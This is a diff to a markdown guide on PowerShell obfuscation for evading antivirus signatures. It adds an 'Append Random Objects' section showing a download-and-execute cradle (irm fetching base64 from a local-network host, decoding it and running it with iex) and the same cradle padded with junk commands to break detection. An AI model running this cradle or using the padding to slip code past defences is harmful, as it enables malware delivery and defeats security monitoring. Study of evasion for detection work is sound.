@@ -3,8 +3,9 @@
 ## Techniques
 1. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
 2. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
-3. [Substitute-Loops](Substitute-Loops)
-4. [Append/Remove Comments](#Append\/Remove-Comments)
+3. [Substitute Loops](Substitute-Loops)
+4. [Append Random Objects](Append-Random-Objects)
+5. [Append/Remove Comments](#Append\/Remove-Comments)
 
 ![image](https://user-images.githubusercontent.com/75489922/231490064-863ab464-84f3-4b38-9c9e-a48c23e3070c.png)
 
@@ -113,6 +114,21 @@ There are certain loops that can be substituted with other loop types or functio
    runToInfinity;
  }
  ```
+
+## Append Random Objects
+You can "pollute" a script with random variables and functions. Assume the following script as malicious:  
+```
+$b64 = $(irm -uri http://192.168.0.66/malware); 
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
+iex $virus;
+```
+
+You might be able to break its signature by doing something like:
+```
+$b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Process | Out-Null;
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
+iex $virus;
+```
 
 ## Append/Remove Comments
 ### Appending Comments
